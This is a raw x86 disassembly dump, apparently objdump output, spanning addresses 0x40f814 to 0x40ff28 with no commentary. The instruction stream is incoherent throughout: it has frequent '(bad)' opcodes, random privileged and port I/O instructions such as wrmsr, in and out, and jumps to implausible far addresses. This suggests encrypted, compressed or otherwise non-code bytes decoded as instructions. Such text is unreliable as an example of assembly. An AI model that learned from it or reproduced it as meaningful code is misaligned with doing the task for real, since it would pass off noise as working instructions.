  40f814:	inc    BYTE PTR [esi-0x7a]
  40f817:	ins    DWORD PTR es:[edi],dx
  40f818:	mov    BYTE PTR [edx],bh
  40f81a:	das    
  40f81b:	jb     0x40f7ce
  40f81d:	pushf  
  40f81e:	mov    es,WORD PTR [edx+0x35]
  40f821:	ror    BYTE PTR [esi-0x743fce7c],0xbb
  40f828:	pop    ebx
  40f829:	and    bh,0x6
  40f82c:	syscall 
  40f82e:	cwde   
  40f82f:	inc    edx
  40f830:	fsub   DWORD PTR [edx+0x7a]
  40f833:	imul   edx,DWORD PTR [edx+0x7],0xffffff8e
  40f837:	ds pop edi
  40f839:	fisttp DWORD PTR [edx-0x71caf8a7]
  40f83f:	pop    ecx
  40f840:	jl     0x40f8a7
  40f842:	inc    esi
  40f843:	or     eax,0x6290c2b6
  40f848:	enter  0xac15,0x41
  40f84c:	test   DWORD PTR [esi-0x6e],eax
  40f84f:	mov    ah,0xff
  40f851:	dec    BYTE PTR [ebp-0x24f93bb6]
  40f857:	std    
  40f858:	jnp    0x40f823
  40f85a:	xor    ebx,DWORD PTR [esi]
  40f85c:	cmp    esp,eax
  40f85e:	sbb    eax,0x58b4d0f1
  40f863:	pop    ebx
  40f864:	loopne 0x40f8b8
  40f866:	mov    BYTE PTR fs:[eax],0x1d
  40f86a:	and    DWORD PTR [edi+0x2e62123e],ebp
  40f870:	test   al,0xe6
  40f872:	std    
  40f873:	jle    0x40f8c9
  40f875:	pop    ss
  40f876:	leave  
  40f877:	pop    ecx
  40f878:	loopne 0x40f8de
  40f87a:	sub    DWORD PTR [ebx+ecx*1+0x78223b24],ecx
  40f881:	aas    
  40f882:	and    DWORD PTR [ecx-0x63cdeab3],edx
  40f888:	add    ebp,DWORD PTR [edx]
  40f88a:	mov    dh,0x25
  40f88c:	mov    ecx,0xddf71aa2
  40f891:	mov    dh,0x55
  40f893:	push   0xb105db94
  40f898:	cs shl bh,0x5f
  40f89c:	int3   
  40f89d:	gs push 0xfd59bb9a
  40f8a3:	and    dl,BYTE PTR [edi+edi*2]
  40f8a6:	(bad)  
  40f8a8:	loop   0x40f87c
  40f8aa:	and    ch,BYTE PTR [ebx+0x46fd4473]
  40f8b0:	xchg   ecx,eax
  40f8b1:	push   DWORD PTR [edi+esi*1-0x2c77aec2]
  40f8b8:	jle    0x40f85d
  40f8ba:	sub    edi,DWORD PTR [eax-0x31]
  40f8bd:	or     ebp,DWORD PTR [edx+eax*4+0x28a0e841]
  40f8c4:	(bad)  
  40f8c5:	lods   al,BYTE PTR ds:[esi]
  40f8c6:	fnstsw WORD PTR [esi+0x1590849c]
  40f8cc:	lea    esi,[esi-0x75]
  40f8cf:	mov    esi,es
  40f8d1:	add    DWORD PTR [esi-0xd2735d6],esi
  40f8d7:	mov    bl,cl
  40f8d9:	rcr    DWORD PTR [edx-0x127c86fb],1
  40f8df:	das    
  40f8e0:	cmp    BYTE PTR [edx],cl
  40f8e2:	add    al,0xc5
  40f8e4:	pushf  
  40f8e5:	out    dx,al
  40f8e6:	or     dh,bh
  40f8e8:	scas   eax,DWORD PTR es:[edi]
  40f8e9:	popa   
  40f8ea:	mov    al,0x24
  40f8ec:	jb     0x40f885
  40f8ee:	(bad)  
  40f8ef:	iret   
  40f8f0:	arpl   WORD PTR [esi],bx
  40f8f2:	(bad)  
  40f8f3:	cmp    DWORD PTR [ecx+0x28],eax
  40f8f6:	ret    0xfc81
  40f8f9:	nop
  40f8fa:	in     eax,dx
  40f8fb:	shl    BYTE PTR [ecx],cl
  40f8fd:	lock jns 0x40f952
  40f900:	sub    al,0x47
  40f902:	data16 xor al,0x4a
  40f905:	leave  
  40f906:	outs   dx,DWORD PTR ds:[esi]
  40f907:	and    ebx,eax
  40f909:	gs (bad) 
  40f90c:	pop    ebx
  40f90d:	dec    ebx
  40f90e:	aam    0xa3
  40f910:	jb     0x40f90d
  40f912:	mov    cl,0xa4
  40f914:	adc    bh,dl
  40f916:	xchg   esp,eax
  40f917:	xchg   ebp,eax
  40f918:	hlt    
  40f919:	xchg   BYTE PTR [edx-0x15732526],dl
  40f91f:	sub    al,0x3f
  40f921:	jns    0x40f913
  40f923:	fisub  DWORD PTR [esi+eax*2-0x1e]
  40f927:	cmp    bh,ch
  40f929:	out    0xa9,eax
  40f92b:	ins    DWORD PTR es:[edi],dx
  40f92c:	data16 jmp 0x40f91a
  40f92f:	inc    edx
  40f930:	ins    BYTE PTR es:[edi],dx
  40f931:	fld    QWORD PTR [ecx-0x1d]
  40f934:	call   0xa4c25acc
  40f939:	xchg   ebp,eax
  40f93a:	xchg   edx,eax
  40f93b:	cmp    esp,DWORD PTR [ecx]
  40f93d:	dec    ebp
  40f93e:	test   DWORD PTR fs:[edi],ecx
  40f941:	fldcw  WORD PTR [edi-0x20c981cc]
  40f947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f948:	push   0x4650ecb2
  40f94d:	dec    ecx
  40f94e:	jl     0x40f8e6
  40f950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f951:	cmp    eax,0x12ce7c67
  40f956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f957:	mov    al,ds:0xec54cc79
  40f95c:	fwait
  40f95d:	outs   dx,BYTE PTR ds:[esi]
  40f95e:	outs   dx,BYTE PTR ds:[esi]
  40f95f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f960:	push   esi
  40f961:	jne    0x40f91c
  40f963:	ss or  al,0xa6
  40f966:	int3   
  40f967:	js     0x40f929
  40f969:	call   0xf97e:0x4b166d60
  40f970:	xchg   ch,bl
  40f972:	hlt    
  40f973:	out    dx,eax
  40f974:	xchg   edx,eax
  40f975:	sahf   
  40f976:	mov    dh,0x8c
  40f978:	and    al,0x6d
  40f97a:	(bad)  
  40f97b:	jp     0x40f928
  40f97d:	ret    0xa9c9
  40f980:	test   DWORD PTR [ecx+0x434789ee],0xbdd57dc0
  40f98a:	mov    fs,WORD PTR [esp+edi*4]
  40f98d:	sub    edi,DWORD PTR [eax+0x475c71ab]
  40f993:	inc    edx
  40f994:	pop    esi
  40f995:	nop
  40f996:	and    BYTE PTR [edi+0x72],ch
  40f999:	rol    DWORD PTR [edx],cl
  40f99b:	mov    ch,BYTE PTR [eax*4+0x509b9aec]
  40f9a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9a3:	lods   eax,DWORD PTR ds:[esi]
  40f9a4:	sbb    ecx,DWORD PTR [bx+di-0x70]
  40f9a8:	mov    dl,0x27
  40f9aa:	inc    edi
  40f9ab:	adc    ecx,edx
  40f9ad:	hlt    
  40f9ae:	xchg   BYTE PTR [edx],al
  40f9b0:	or     ecx,ebx
  40f9b2:	cmp    al,0xcc
  40f9b4:	inc    esp
  40f9b5:	out    dx,eax
  40f9b6:	(bad)  
  40f9b7:	rol    DWORD PTR [ebp+0x37],1
  40f9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9bb:	xor    ebx,ebx
  40f9bd:	ss adc eax,esp
  40f9c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9c1:	in     al,0x4a
  40f9c3:	aas    
  40f9c4:	mov    bl,0x31
  40f9c6:	fnsave [esi]
  40f9c8:	jmp    0xca9f735e
  40f9cd:	sub    bl,BYTE PTR gs:[ecx]
  40f9d0:	dec    ecx
  40f9d1:	jo     0x40f9ed
  40f9d3:	push   ecx
  40f9d4:	jne    0x40fa1d
  40f9d6:	in     al,dx
  40f9d7:	dec    si
  40f9d9:	xchg   esi,eax
  40f9da:	stos   DWORD PTR es:[edi],eax
  40f9db:	xor    DWORD PTR [eax-0x33d5b33f],edx
  40f9e1:	cld    
  40f9e2:	into   
  40f9e3:	ds push 0xc62623b4
  40f9e9:	adc    eax,0xd7dfaba4
  40f9ee:	add    cl,BYTE PTR [edi-0x3173cc36]
  40f9f4:	das    
  40f9f5:	sub    BYTE PTR [edi-0x71],al
  40f9f8:	jl     0x40fa26
  40f9fa:	in     eax,dx
  40f9fb:	jnp    0x40fa56
  40f9fd:	stos   DWORD PTR es:[edi],eax
  40f9fe:	sub    eax,0xd6b568e8
  40fa03:	jnp    0x40f9cb
  40fa05:	xor    BYTE PTR [bx+si+0x5162],al
  40fa0a:	cmp    bh,BYTE PTR [edi]
  40fa0c:	or     BYTE PTR [eax],ch
  40fa0e:	push   ds
  40fa0f:	adc    DWORD PTR [edx+0x5e],0xda5e297e
  40fa16:	mov    al,BYTE PTR [eax]
  40fa18:	inc    esp
  40fa19:	or     al,0x1b
  40fa1b:	or     DWORD PTR [edi+0x18],ecx
  40fa1e:	fidiv  DWORD PTR [ecx]
  40fa20:	xor    eax,0x72ad3e78
  40fa25:	mov    esi,0xdff98794
  40fa2a:	or     esp,DWORD PTR [ebx+edi*8]
  40fa2d:	leave  
  40fa2e:	enter  0x681b,0xfd
  40fa32:	adc    edx,edi
  40fa34:	cwde   
  40fa35:	and    ebp,DWORD PTR [ecx+0x7]
  40fa38:	xchg   ebp,eax
  40fa39:	pushf  
  40fa3a:	in     eax,dx
  40fa3b:	outs   dx,BYTE PTR ds:[esi]
  40fa3c:	cmp    ecx,esp
  40fa3e:	inc    eax
  40fa3f:	aaa    
  40fa40:	mov    dh,0x85
  40fa42:	(bad)  
  40fa44:	add    al,0x1d
  40fa46:	cmp    BYTE PTR [edx+0x5b6aaa03],dl
  40fa4c:	in     al,dx
  40fa4d:	pcmpeqw mm2,QWORD PTR [ecx-0x4a544fb]
  40fa54:	mov    ?,ecx
  40fa56:	loop   0x40fa74
  40fa58:	pop    es
  40fa59:	pop    ebx
  40fa5a:	ja     0x40fa81
  40fa5c:	pop    esi
  40fa5d:	sub    al,0x43
  40fa5f:	call   0x1e80:0x470b5ef4
  40fa66:	xchg   ebx,eax
  40fa67:	add    al,0x43
  40fa69:	xchg   ebx,eax
  40fa6a:	mov    eax,ds:0xd355a932
  40fa6f:	mov    ds:0x1fe3767,eax
  40fa74:	and    DWORD PTR [eax],ebx
  40fa76:	das    
  40fa77:	int3   
  40fa78:	fsubr  st,st(5)
  40fa7a:	pop    es
  40fa7b:	cmp    eax,0xf5d21407
  40fa80:	mov    WORD PTR [eax],fs
  40fa82:	push   esp
  40fa83:	mov    dh,0x72
  40fa85:	popa   
  40fa86:	inc    ebx
  40fa87:	leave  
  40fa88:	sbb    eax,0x4cac789
  40fa8d:	dec    ecx
  40fa8e:	push   cs
  40fa8f:	or     eax,0xf163e77c
  40fa94:	xor    al,0xd4
  40fa96:	xchg   ebp,eax
  40fa97:	mov    DWORD PTR [ebp-0x5ed1b6be],0x7d31c5
  40faa1:	inc    esi
  40faa2:	ins    DWORD PTR es:[edi],dx
  40faa3:	push   esi
  40faa4:	pop    edx
  40faa5:	cwde   
  40faa6:	repz sti 
  40faa8:	test   DWORD PTR [eax-0x4a826366],ebx
  40faae:	lea    esi,[eax+0x7f11c019]
  40fab4:	pop    es
  40fab5:	sub    eax,0x35e18240
  40faba:	cvttps2pi mm2,xmm0
  40fabd:	dec    ebp
  40fabe:	scas   eax,DWORD PTR es:[edi]
  40fabf:	(bad)  
  40fac0:	das    
  40fac1:	shr    ecx,0x63
  40fac4:	sbb    al,0x17
  40fac6:	clc    
  40fac7:	adc    bh,BYTE PTR [ecx]
  40fac9:	je     0x40fb18
  40facb:	pop    es
  40facc:	cmp    ah,cl
  40face:	(bad)  
  40facf:	shl    bl,1
  40fad1:	adc    esi,ebp
  40fad3:	or     ch,BYTE PTR [ebp+0x62]
  40fad6:	lock inc edx
  40fad8:	push   esp
  40fad9:	popf   
  40fada:	pop    eax
  40fadb:	cmp    al,0x4d
  40fadd:	push   es
  40fade:	test   eax,0x9111cf93
  40fae3:	or     eax,0x179b91d9
  40fae8:	mov    edx,0x4d3266a2
  40faed:	fwait
  40faee:	xor    edx,DWORD PTR [ebx+0x5e]
  40faf1:	push   ss
  40faf2:	or     esi,esp
  40faf4:	xor    al,0xcd
  40faf6:	jp     0x40fb43
  40faf8:	push   ebx
  40faf9:	and    BYTE PTR [ebp+0x3aaf3c8d],cl
  40faff:	les    esp,FWORD PTR [esi-0x5]
  40fb02:	sub    cl,cl
  40fb04:	mov    dl,0x5e
  40fb06:	clc    
  40fb07:	daa    
  40fb08:	cmp    al,0xb4
  40fb0a:	ret    0x789f
  40fb0d:	loope  0x40fb5a
  40fb0f:	shl    ch,1
  40fb11:	mov    ss,WORD PTR [edx+0x55a8431]
  40fb17:	xchg   esi,eax
  40fb19:	xlat   BYTE PTR ds:[ebx]
  40fb1a:	pop    ss
  40fb1b:	daa    
  40fb1c:	xchg   edx,eax
  40fb1d:	mov    BYTE PTR [edi+0x40],ch
  40fb20:	iret   
  40fb21:	mov    dl,0x78
  40fb23:	bound  ebp,QWORD PTR [eax]
  40fb25:	dec    edi
  40fb26:	cmp    DWORD PTR ds:0x221dc01b,eax
  40fb2c:	popf   
  40fb2d:	mov    WORD PTR [eax-0x6e],ds
  40fb30:	pusha  
  40fb31:	dec    ecx
  40fb32:	pop    esi
  40fb33:	out    0x13,al
  40fb35:	fincstp 
  40fb37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb38:	pop    eax
  40fb39:	inc    edx
  40fb3a:	fmul   QWORD PTR [esi-0x5]
  40fb3d:	dec    esp
  40fb3e:	mov    bl,0xa5
  40fb40:	rol    DWORD PTR [esi-0x6c658a9f],1
  40fb46:	push   ebx
  40fb47:	mov    dl,0x96
  40fb49:	jne    0x40fb50
  40fb4b:	push   es
  40fb4c:	pop    ss
  40fb4d:	dec    eax
  40fb4e:	or     al,BYTE PTR [edx]
  40fb50:	retf   0xbc2
  40fb53:	cmp    eax,0x1eb5591d
  40fb59:	jl     0x40fb3b
  40fb5b:	xor    cl,bh
  40fb5d:	lods   eax,DWORD PTR ds:[esi]
  40fb5e:	sti    
  40fb5f:	ins    BYTE PTR es:[edi],dx
  40fb60:	mov    ebp,DWORD PTR [ebp-0x3b]
  40fb63:	xor    eax,0x4753e30a
  40fb68:	rcr    BYTE PTR [ebx],cl
  40fb6a:	mov    dh,0x39
  40fb6c:	das    
  40fb6d:	sbb    eax,esi
  40fb6f:	xchg   ebp,eax
  40fb70:	aam    0xf5
  40fb72:	aam    0x1d
  40fb74:	mov    edi,0x1a91243f
  40fb79:	scas   eax,DWORD PTR es:[edi]
  40fb7a:	in     eax,0x79
  40fb7c:	xchg   ebx,eax
  40fb7d:	loopne 0x40fb18
  40fb7f:	push   0x6a
  40fb81:	fwait
  40fb82:	mov    bl,0xd3
  40fb84:	xor    eax,DWORD PTR [esi+0x274b7de5]
  40fb8a:	(bad)  
  40fb8b:	jnp    0x40fbfb
  40fb8d:	pop    ebp
  40fb8e:	call   0xea77dcb8
  40fb93:	(bad)  
  40fb94:	xor    DWORD PTR [edx+0x1],ecx
  40fb97:	add    DWORD PTR [edi-0xfea150c],edi
  40fb9d:	xchg   edi,eax
  40fb9e:	xor    ch,dl
  40fba0:	pop    ds
  40fba1:	inc    esp
  40fba2:	adc    edi,edx
  40fba4:	rcr    DWORD PTR [edi],cl
  40fba6:	lock xor DWORD PTR ds:[esi],0x2276d638
  40fbae:	arpl   WORD PTR [edi+ebp*2],sp
  40fbb1:	pop    eax
  40fbb2:	pop    eax
  40fbb3:	mov    edx,0xb83c40bd
  40fbb8:	inc    ecx
  40fbb9:	pop    ds
  40fbba:	or     DWORD PTR gs:[di],esi
  40fbbe:	push   edi
  40fbbf:	mov    edi,0xde2b8ae9
  40fbc4:	sub    ah,BYTE PTR [edi-0x3dc05b08]
  40fbca:	mov    ds:0x5fdc90ce,eax
  40fbcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbd0:	push   es
  40fbd1:	(bad)  
  40fbd2:	in     al,0x8b
  40fbd4:	je     0x40fbdc
  40fbd6:	sbb    eax,0xbae731df
  40fbdb:	jp     0x40fbeb
  40fbdd:	mov    esi,0xaedf8175
  40fbe2:	cmp    al,0x7d
  40fbe4:	mov    al,ds:0xabd2aa39
  40fbe9:	iret   
  40fbea:	cmp    bl,BYTE PTR [ecx]
  40fbec:	push   ss
  40fbed:	cmp    cl,cl
  40fbef:	mov    WORD PTR [edi+eax*1+0x7],ss
  40fbf3:	jp     0x40fbe8
  40fbf5:	scas   eax,DWORD PTR es:[edi]
  40fbf6:	shl    BYTE PTR [edi-0x17f0de72],1
  40fbfc:	leave  
  40fbfd:	dec    ebp
  40fbfe:	stc    
  40fbff:	ror    DWORD PTR [ebx-0x42b438e9],cl
  40fc05:	daa    
  40fc06:	das    
  40fc07:	xchg   edx,eax
  40fc08:	ficomp DWORD PTR ds:0x8c019404
  40fc0e:	out    dx,al
  40fc0f:	dec    esi
  40fc10:	adc    eax,0x69db6c41
  40fc15:	out    0x6e,eax
  40fc17:	pop    ebx
  40fc18:	mov    esp,0x26cda446
  40fc1d:	aas    
  40fc1e:	imul   esp,DWORD PTR [ebx-0x21],0x60e39180
  40fc25:	(bad)  
  40fc26:	fstp   DWORD PTR ds:0x58171f7f
  40fc2c:	mov    ds:0x5e17c2b1,al
  40fc31:	nop
  40fc32:	mov    ds:0x9dbf5861,al
  40fc37:	dec    eax
  40fc38:	lock mov edi,?
  40fc3b:	push   ebx
  40fc3c:	popf   
  40fc3d:	mov    al,0xe7
  40fc3f:	mov    al,0x42
  40fc41:	add    DWORD PTR [edi],edi
  40fc43:	daa    
  40fc44:	cmp    al,0xd9
  40fc46:	push   esp
  40fc47:	adc    al,cl
  40fc49:	and    esi,DWORD PTR [edx]
  40fc4b:	cmp    DWORD PTR [ebx],eax
  40fc4d:	iret   
  40fc4e:	mov    ah,0x2b
  40fc50:	push   edi
  40fc51:	test   DWORD PTR [esi],esi
  40fc53:	or     al,0x26
  40fc55:	pop    edi
  40fc56:	jb     0x40fbeb
  40fc58:	int3   
  40fc59:	or     al,0xd4
  40fc5b:	mov    DWORD PTR [edi],esi
  40fc5d:	and    dh,BYTE PTR [ebp+0x1e4287d8]
  40fc63:	sub    bh,BYTE PTR [edi+0x4f71a2b6]
  40fc69:	mov    ebx,0xe1e2245b
  40fc6e:	sbb    DWORD PTR [ebx+0x67],0x2ed12364
  40fc75:	add    eax,0xaebf2e5c
  40fc7a:	inc    eax
  40fc7b:	cs fwait
  40fc7d:	nop    DWORD PTR [edi]
  40fc80:	nop
  40fc81:	sbb    BYTE PTR [edx+edi*4+0x40f4f0fe],ah
  40fc88:	mov    fs,WORD PTR [ecx-0x49df16b3]
  40fc8e:	iret   
  40fc8f:	xor    cl,BYTE PTR [ebx]
  40fc91:	neg    ebp
  40fc93:	fcomp  QWORD PTR [edi-0x2397407c]
  40fc99:	outs   dx,BYTE PTR ds:[esi]
  40fc9a:	mov    bl,0xc0
  40fc9c:	jbe    0x40fc41
  40fc9e:	mov    ds:0xfbc49052,al
  40fca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fca4:	addr16 gs pop esp
  40fca7:	ins    BYTE PTR es:[edi],dx
  40fca8:	dec    ebx
  40fca9:	cmp    BYTE PTR [ebx],bl
  40fcab:	xchg   esi,eax
  40fcac:	dec    ebx
  40fcad:	dec    eax
  40fcae:	jmp    0xa39d1aa1
  40fcb3:	test   eax,0x9eec7b4f
  40fcb8:	retf   0xe631
  40fcbb:	in     al,dx
  40fcbc:	xchg   BYTE PTR [esi],dh
  40fcbe:	push   esi
  40fcbf:	sub    BYTE PTR ss:[eax],ah
  40fcc2:	xor    DWORD PTR [ecx+ebx*2],ecx
  40fcc5:	test   BYTE PTR [edi+0x17],dl
  40fcc8:	xchg   DWORD PTR [ebx+esi*4-0x13],ecx
  40fccc:	push   es
  40fccd:	dec    ebx
  40fcce:	imul   ebp,DWORD PTR [ecx+ebx*1-0x3d2bc2d],0x2e
  40fcd6:	lea    ebx,[edi+ecx*1]
  40fcd9:	cmp    BYTE PTR [ebp-0x6c],cl
  40fcdc:	dec    eax
  40fcdd:	test   DWORD PTR [edx],ebx
  40fcdf:	retf   0x41ad
  40fce2:	push   edi
  40fce3:	popf   
  40fce4:	xchg   edx,eax
  40fce5:	jno    0x40fc92
  40fce7:	mov    ch,0x8e
  40fce9:	int3   
  40fcea:	ss push ecx
  40fcec:	(bad)  
  40fced:	xchg   ecx,eax
  40fcee:	cmp    ah,ah
  40fcf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcf2:	mov    ah,0x78
  40fcf4:	add    DWORD PTR [edi+0x74e567ec],esi
  40fcfa:	mov    dh,dl
  40fcfc:	sub    eax,0xa951103f
  40fd01:	mov    edx,0x4345ca12
  40fd06:	xor    edi,DWORD PTR [bx+si]
  40fd09:	rcr    BYTE PTR [eax-0x177d232b],cl
  40fd0f:	push   cs
  40fd10:	push   ebp
  40fd11:	dec    ecx
  40fd12:	out    0x15,al
  40fd14:	xor    eax,0x1c328fac
  40fd19:	xlat   BYTE PTR ds:[ebx]
  40fd1a:	nop
  40fd1b:	int3   
  40fd1c:	es (bad) 
  40fd1e:	into   
  40fd1f:	xchg   esi,eax
  40fd20:	adc    eax,0x74048beb
  40fd25:	test   esp,esi
  40fd27:	or     edx,DWORD PTR [eax]
  40fd29:	repz shl BYTE PTR [ecx-0x29b70d5],0xfe
  40fd31:	fwait
  40fd32:	xor    ebp,ecx
  40fd34:	cmp    BYTE PTR [eax],bl
  40fd36:	mov    ah,0x45
  40fd38:	jne    0x40fd6f
  40fd3a:	sbb    eax,0x67ec45e0
  40fd3f:	lods   eax,DWORD PTR ds:[esi]
  40fd40:	in     eax,0x6a
  40fd42:	cmp    esi,eax
  40fd44:	out    dx,al
  40fd45:	pop    ebx
  40fd46:	popa   
  40fd47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd49:	mov    al,ds:0x94587a4
  40fd4e:	leave  
  40fd4f:	fcom   QWORD PTR [edi+0x2b925b0f]
  40fd55:	cmp    ebx,esi
  40fd57:	fs inc ecx
  40fd59:	push   DWORD PTR [edi]
  40fd5b:	mov    edx,ebp
  40fd5d:	xchg   esp,eax
  40fd5e:	dec    esi
  40fd5f:	loop   0x40fd93
  40fd61:	in     eax,0xd1
  40fd63:	popa   
  40fd64:	push   esi
  40fd65:	test   eax,0xd65944af
  40fd6a:	test   DWORD PTR [ebp+eax*1+0x35b1ea6b],eax
  40fd71:	add    ah,0xe8
  40fd74:	inc    ebp
  40fd75:	leave  
  40fd76:	or     cl,BYTE PTR [esp+ebx*4+0x20f1134c]
  40fd7d:	cld    
  40fd7e:	stos   BYTE PTR es:[edi],al
  40fd7f:	sub    al,0x50
  40fd81:	xor    BYTE PTR [edx+0x120cb773],dh
  40fd87:	shl    BYTE PTR [ebp-0x1950d8f],0x3f
  40fd8e:	leave  
  40fd8f:	dec    esp
  40fd90:	das    
  40fd91:	sbb    esi,ebx
  40fd93:	mov    WORD PTR [ecx-0x3d25df3],ds
  40fd99:	rcr    ebx,1
  40fd9b:	out    0xb9,al
  40fd9d:	dec    ecx
  40fd9e:	xchg   ebx,edi
  40fda0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fda1:	mov    dh,0x39
  40fda3:	pop    ecx
  40fda4:	xor    DWORD PTR [eax+eiz*8-0x2c],edi
  40fda8:	push   eax
  40fda9:	hlt    
  40fdaa:	in     al,0xea
  40fdac:	pop    edi
  40fdad:	repnz or ecx,DWORD PTR [edx+edi*1+0x66]
  40fdb2:	fs mov al,0xe3
  40fdb5:	jno    0x40fd72
  40fdb7:	scas   eax,DWORD PTR es:[edi]
  40fdb8:	and    esp,DWORD PTR [ebx+0x15]
  40fdbb:	cmc    
  40fdbc:	and    BYTE PTR [esp+esi*4+0x8],bl
  40fdc0:	and    esi,0xd7a830c0
  40fdc6:	js     0x40fd91
  40fdc8:	clc    
  40fdc9:	aad    0xed
  40fdcb:	ds push 0xffffff9a
  40fdce:	test   DWORD PTR [ebx-0x4],edx
  40fdd1:	dec    esp
  40fdd2:	push   ebx
  40fdd3:	adc    BYTE PTR [ecx+0x7e],cl
  40fdd6:	hlt    
  40fdd7:	pop    ecx
  40fdd8:	sbb    al,0x5b
  40fdda:	repnz fld DWORD PTR [edx+eiz*8]
  40fdde:	fist   DWORD PTR ds:0xda3aa304
  40fde4:	xchg   BYTE PTR [eax+eiz*8],dl
  40fde7:	rol    BYTE PTR [edi+0x3e],1
  40fdea:	xchg   ebp,eax
  40fdeb:	or     bl,BYTE PTR [ebx+0x21]
  40fdee:	or     al,0x7e
  40fdf0:	add    al,0x5a
  40fdf2:	mov    al,ds:0x496203c9
  40fdf7:	xchg   esi,eax
  40fdf8:	mov    DWORD PTR [eax],edi
  40fdfa:	and    DWORD PTR [esi+0x6158be04],0xffffff8e
  40fe01:	jp     0x40fe57
  40fe03:	xlat   BYTE PTR ds:[ebx]
  40fe04:	sbb    eax,0x4f67b573
  40fe09:	int    0xad
  40fe0b:	push   eax
  40fe0c:	inc    edi
  40fe0d:	xor    ebp,DWORD PTR [eax+0x7729cdde]
  40fe13:	pop    es
  40fe14:	clc    
  40fe15:	iret   
  40fe16:	xor    al,0xb6
  40fe18:	dec    esi
  40fe19:	mov    fs,WORD PTR [edi]
  40fe1b:	adc    DWORD PTR [ecx],edx
  40fe1d:	ss call 0xb0035c94
  40fe23:	fmulp  st(5),st
  40fe25:	pop    ss
  40fe26:	loop   0x40fe7f
  40fe28:	fdiv   QWORD PTR [ebx-0xf]
  40fe2b:	inc    ecx
  40fe2c:	sti    
  40fe2d:	xchg   DWORD PTR [edi+0x691325dc],eax
  40fe33:	into   
  40fe34:	fist   WORD PTR [eax+0x1d7890fb]
  40fe3a:	arpl   WORD PTR [esi+eax*4-0x7d],ax
  40fe3e:	xchg   esi,eax
  40fe3f:	cmp    al,BYTE PTR [eax+0x65]
  40fe42:	out    0xe0,al
  40fe44:	(bad)  
  40fe45:	sti    
  40fe46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe47:	(bad)  
  40fe48:	add    bl,dh
  40fe4a:	aad    0xa7
  40fe4c:	mov    ecx,0x9ae3d4da
  40fe51:	jl     0x40fe53
  40fe53:	xchg   esi,eax
  40fe54:	jmp    0x9bcd76a6
  40fe59:	push   ecx
  40fe5a:	dec    esi
  40fe5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe5c:	pop    ss
  40fe5d:	pop    edi
  40fe5e:	jne    0x40fe14
  40fe60:	jmp    0x40febe
  40fe62:	rol    DWORD PTR [ebp-0x29c9407b],1
  40fe68:	cwde   
  40fe69:	cmp    esi,DWORD PTR [ebp-0x25]
  40fe6c:	sub    eax,0x4efcaeb0
  40fe71:	aam    0x87
  40fe73:	call   0xe23c36a7
  40fe78:	std    
  40fe79:	repz xor BYTE PTR [ebx+edi*4-0x424d20d],ch
  40fe81:	lock mov ch,0x61
  40fe84:	mov    ebx,DWORD PTR [ecx+0x2eaadc9]
  40fe8a:	daa    
  40fe8b:	dec    ecx
  40fe8c:	mov    ch,0xc0
  40fe8e:	lea    ebp,[eax+0x3f]
  40fe91:	dec    esi
  40fe92:	and    dh,dl
  40fe94:	mov    al,ds:0x156d715b
  40fe99:	add    dl,BYTE PTR [edx]
  40fe9b:	gs xchg edx,eax
  40fe9d:	xor    eax,0xd1c96d0d
  40fea2:	dec    ebx
  40fea3:	pop    esp
  40fea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fea5:	fnstcw WORD PTR [edi+0x48]
  40fea8:	test   DWORD PTR fs:[di],0x7e15708e
  40feb0:	sbb    ebp,DWORD PTR [ecx]
  40feb2:	scas   al,BYTE PTR es:[edi]
  40feb3:	neg    ecx
  40feb5:	cwde   
  40feb6:	dec    edx
  40feb7:	pop    es
  40feb8:	inc    ebp
  40feb9:	in     al,dx
  40feba:	fndisi(8087 only) 
  40febc:	loope  0x40fe75
  40febe:	gs add eax,0x6a24c2e6
  40fec4:	outs   dx,DWORD PTR es:[esi]
  40fec6:	call   0xf19d:0x40ac55a4
  40fecd:	div    esi
  40fecf:	inc    edi
  40fed0:	lods   al,BYTE PTR ds:[esi]
  40fed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fed2:	jmp    0xf5e0f724
  40fed7:	lods   eax,DWORD PTR ds:[esi]
  40fed8:	sub    esp,DWORD PTR [edx+0x2f043f31]
  40fede:	(bad)  
  40fedf:	or     edx,eax
  40fee1:	(bad)
  40fee4:	imul   esi,edx,0xffffffb8
  40fee7:	into   
  40fee8:	inc    esp
  40fee9:	fs (bad) 
  40feeb:	pop    edi
  40feec:	inc    edi
  40feed:	(bad)  
  40feee:	aam    0x7c
  40fef0:	push   cs
  40fef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fef2:	sti    
  40fef3:	jne    0x40feaf
  40fef5:	mov    es,WORD PTR [ebx-0x6e]
  40fef8:	cmp    BYTE PTR [ecx-0x53c488d5],dl
  40fefe:	(bad)  
  40feff:	(bad)  ds:0xcc2b3ef5
  40ff05:	mov    bl,0xad
  40ff07:	loop   0x40fea1
  40ff09:	rcr    DWORD PTR ds:0x5a60a16c,1
  40ff0f:	popa   
  40ff10:	wrmsr  
  40ff12:	pushf  
  40ff13:	fst    DWORD PTR [ebx+0x82a0a18]
  40ff19:	xchg   esi,eax
  40ff1a:	sbb    DWORD PTR [ecx],ecx
  40ff1c:	mov    eax,0x84981d59
  40ff21:	pop    ds
  40ff22:	push   eax
  40ff23:	dec    ecx
  40ff24:	dec    ecx
  40ff25:	retf   0x28aa
  40ff28:	add    ch,cl
